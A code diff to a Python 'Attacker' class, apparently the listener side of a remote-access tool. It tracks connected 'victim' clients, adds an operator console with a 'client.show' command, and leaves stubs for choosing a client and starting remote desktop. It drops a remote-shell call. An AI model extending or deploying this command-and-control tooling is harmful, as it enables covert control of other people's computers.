@@ -1,4 +1,6 @@
+import logging
 import socket
+import sys
 
 import threading
 import tkinter as tk
@@ -18,7 +20,10 @@ class Attacker:
 
         self.connected_clients = list()
 
+        logging.basicConfig(level=logging.DEBUG,format="%(message)s")
+
     def main(self):
+        threading.Thread(target=self.__admin_input).start()
         self.__start_listing()
 
     def __start_listing(self):
@@ -27,7 +32,7 @@ class Attacker:
         try:
             while True:
                 conn, addr = self.server.accept()
-                print(f'connection from: {addr}')
+                print(f"connection from: {addr}")
 
                 threading.Thread(target=self.__on_new_client, args=(conn, addr)).start()
 
@@ -37,12 +42,24 @@ class Attacker:
 
     def __on_new_client(self, conn, addr):
         self.connected_clients.append(VictimData(conn, addr))
-        RemoteShellAttackerSide(conn).main()
 
     def __admin_input(self):
-        pass
+        while True:
+            raw_command = input("attacker % ",)
+            command_components = raw_command.split(' ')
+            command = command_components[0]
+            command_args = command_components[1:]
 
-    def __choose_client(self, args: list):
+            if raw_command == "client.show":
+                self.__show_connected_clients()
+
+    def __show_connected_clients(self):
+        print('-' * 20)
+        for i, client in enumerate(self.connected_clients, start=1):
+            print(f'{i}. {client.addr}')
+        print('-' * 20)
+
+    def __choose_client(self):
         pass
 
     def __start_remote_desktop(self):
